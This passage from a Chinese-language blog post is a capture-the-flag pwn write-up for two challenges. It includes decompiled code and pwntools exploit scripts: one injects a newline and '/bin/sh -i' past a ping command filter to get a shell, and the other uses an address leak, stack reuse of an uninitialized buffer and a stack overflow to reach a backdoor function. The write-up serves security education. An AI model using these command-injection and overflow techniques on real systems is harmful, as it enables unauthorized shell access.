&#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Invalid_hostname_or_IP = <span class="string">&quot;Invalid hostname or IP!&quot;</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid hostname or IP!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = v7 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    _stack_chk_fail(Invalid_hostname_or_IP, p_buf);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_BOOL8 __fastcall <span class="title function_">check</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strpbrk</span>(s, <span class="string">&quot;;&amp;|&gt;&lt;$()&#123;&#125;[]&#x27;\&quot;`\\!~*&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过观察<code> _snprintf_chk(command, 32, 1, 32, &quot;ping %s -c 4&quot;, (const char *)buf);</code> 这个指令，存在格式化字符串漏洞的可能，于是我们只需要找出合适的方法将 <code>ping %s -c 4 </code>拆成两个指令的方式<br />
+就可以获取的到shell， 而<code>check</code> 函数中函数没有过滤掉<code>\n #</code> 等字符,所以我们可以写出如下脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;127.0.0.1&#x27;, 44777)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用完整的 shell 路径和交互参数</span></span><br><span class="line">payload = <span class="string">b&quot;\n&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;/bin/sh -i\n&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(b&quot;choice: &quot;)</span></span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;ping: &#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2"></a> 总结</h3>
+<p>在常规攻击方法找不到的时候可以尝试去寻找一些逻辑漏洞</p>
+<h2 id="未初始化缓冲区"><a class="markdownIt-Anchor" href="#未初始化缓冲区"></a> 未初始化缓冲区</h2>
+<p>由于rsp，rbp 这个两个寄存器只是规定栈的范围，所以栈上的数据不会无缘预估的被清理，所以在遇见未初始化的变量的时候考虑一下，栈复用的机制，使用gdb调试查看栈的变化</p>
+<h3 id="例题-meoctf-xdulaker"><a class="markdownIt-Anchor" href="#例题-meoctf-xdulaker"></a> 例题 <a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/22?challenge=892">MEOCTF xdulaker</a></h3>
+<p>通过 <code>checksec ./pwn</code> 发现程序存在如下保护</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+<p>通过ida分析发现有如下关键函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;opt);</span><br><span class="line">      <span class="keyword">if</span> ( opt != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      pull();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opt == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      photo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opt != <span class="number">3</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      laker();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">laker</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s1[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s1, <span class="string">&quot;xdulaker&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are not him.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome,xdulaker&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, s1, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pull</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Thanks,I&#x27;ll give you a gift:%p\n&quot;</span>, &amp;opt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">photo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hey,what&#x27;s your name?!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;I will teach you a lesson.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中 <code>pull</code> 函数可以让我们知道 opt 在函数中的实际地址，从而绕过pie保护获取程序的基地址，保护获取后门函数的地址，同时我们可以看到函数<code>xdulaker</code> 存在栈溢出漏洞，同时使用了，没有初始化的缓冲区<br />
+而<code>photo</code> 则是一个普通的函数，但是通过gdb调试发现在<code>photo</code> 函数的缓冲区中的第32字节后面的内容会被<code>laker</code>函数的缓冲区中访问到,然后就能够绕过<code>laker</code> 函数的判断，让我们能够控制可以造成栈溢出的函数</p>
+<p>于是可以构建出如下脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">45249</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取整个程序的基地址 </span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">optRealAddr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="comment"># optRealAddr    = int(optRealAddrStr, 16)</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Find The opt Address <span class="subst">&#123;<span class="built_in">hex</span>(optRealAddr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 程序的基地址 &amp; 一些其他函数的地址</span></span><br><span class="line"><span class="comment"># optSym = 0x4010</span></span><br><span class="line">optSym = elf.symbols[<span class="string">&quot;opt&quot;</span>]</span><br><span class="line">elf.address = optRealAddr - optSym</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(optSym))</span><br><span class="line"></span><br><span class="line">bkdAddr = elf.address + <span class="number">0x124E</span>         <span class="comment"># 为什么不是函数开头 因为存在 endbr64 需要手动存入传统的函数序言 </span></span><br><span class="line">                                       <span class="comment"># mov     rbp, rsp</span></span><br><span class="line">log.info(<span class="string">f&quot;program base address: <span class="subst">&#123;<span class="built_in">hex</span>(elf.address)&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Address@backdoor: <span class="subst">&#123;<span class="built_in">hex</span>(bkdAddr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈溢出</span></span><br><span class="line"><span class="comment"># p.recvuntil(b&quot;&gt;&quot;)</span></span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">payload1 = flat([</span><br><span class="line">  <span class="string">b&quot;a&quot;</span> * <span class="number">0x20</span>,    <span class="comment"># 32</span></span><br><span class="line">  <span class="string">b&quot;xdulaker&quot;</span>     <span class="comment"># 由于栈的复用机制，s1 的在初始有 photo 函数 0x20 后边的内容</span></span><br><span class="line">])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;ker&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x38</span></span><br><span class="line">payload2 = flat([</span><br><span class="line">  <span class="string">b&quot;a&quot;</span> * offset,</span><br><span class="line">  p64(bkdAddr),</span><br><span class="line">])</span><br><span class="line"><span class="built_in">print</span>(payload2)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="总结-3"><a class="markdownIt-Anchor" href="#总结-3"></a> 总结</h3>
+<p>当遇到程序访问没有初始化数据的缓冲区等类似性质的变量，可以尝试利用gdb调试栈中的状态，可能能通过栈的分布为后续栈溢出攻击创造条件,</p>
+
+
+        <div>
+          
+            <div>
+  
+    <div style="text-align: center; color: #ccc; font-size: 14px; margin: 20px 0;">
+      ---------- 已经到底了啦！ (*/ω＼*) ----------
+    </div>
+  
+</div>
+          
+        </div>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/20/11/19/" rel="prev" title="11.19">
+                  <i class="fa fa-angle-left"></i> 11.19
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">超级玉米人</span>
+  </div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<!-- particles.js 配置和初始化 -->
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  // 立即滚动到顶部
+  window.scrollTo(0, 0);
+  
+  function isHomePage() {
+    const path = window.location.pathname;
+    return path === '/' || path === '/index.html' || path === '/archives/' || path.endsWith('/index.html');
+  }
+
+  if (isHomePage()) {
+    const particlesContainer = document.getElementById('particles-js');
+    if (particlesContainer) {
+      particlesContainer.style.display = 'block';
+      
+      // 初始化打字机效果
+      initTypedEffect();
+      
+      // 初始化 particles.js
+      particlesJS('particles-js', {
+        "particles": {
+          "number": {
+            "value": 80,
+            "density": {
+              "enable": true,
+              "value_area": 800
+            }
+          },
+          "color": {
+            "value": "#ffffff"
+          },
+          "shape": {
+            "type": "circle"
+          },
+          "opacity": {
+            "value": 0.5,
+            "random": false
+          },
+          "size": {
+            "value": 3,
+            "random": true
+          },
+          "line_linked": {
+            "enable": true,
+            "distance": 150,
+            "color": "#ffffff",
+            "opacity": 0.4,
+            "width": 1
+          },
+          "move": {
+            "enable": true,
+            "speed": 2,
+            "direction": "none",
+            "random": false,
+            "straight": false,
+            "out_mode": "out"
+          }
+        },
+        "interactivity": {
+          "detect_on": "canvas",
+          "events": {
+            "onhover": {
+              "enable": true,
+              "mode": "grab"
+            },
+            "onclick": {
+              "enable": true,
+              "mode": "push"
+            },
+            "resize": true
+          },
+          "modes": {
+            "grab": {
+              "distance": 200,
+              "line_linked": {
+                "opacity": 1
+              }
+            },
+            "push": {
+              "particles_nb": 4
+            }
+          }
+        },
+        "retina_detect": true
+      });
+
+      // 向下滚动箭头点击事件
+      document.querySelector('.hero-arrow')?.addEventListener('click', function() {
+        window.scrollTo({
+          top: window.innerHeight,
+          behavior: 'smooth'
+        });
+      });
+    }
+  }
+
+  // 打字机效果初始化函数
+  function initTypedEffect() {
+    // 获取博客副标题，如果没有则使用默认文本
+    const subtitle = "时间Cia不多llo~(∠・ω< )⌒★" || "Welcome to my blog";
+    
+    // 可以设置多个文本循环打字，或者只使用副标题
+    const strings = [
+      subtitle,
+      "Hello World!",  // 可以添加更多文本
+      "来往下滑吧~~~~",
+      "接下来我也不知到要写什么了"
+    ];
+
+    // 初始化 Typed.js
+    new Typed('#typed-text', {
+      strings: strings,
+      typeSpeed: 70,        // 打字速度
+      backSpeed: 40,        // 回退速度
+      backDelay: 2000,      // 回退前的延迟
+      startDelay: 500,      // 开始前的延迟
+      loop: true,           // 循环播放
+      showCursor: true,     // 显示光标
+      cursorChar: '|',      // 光标字符
+      autoInsertCss: true   // 自动插入CSS
+    });
+  }
+});
+
+
+
+
+</script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacity":0.8,"opacityDefault":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
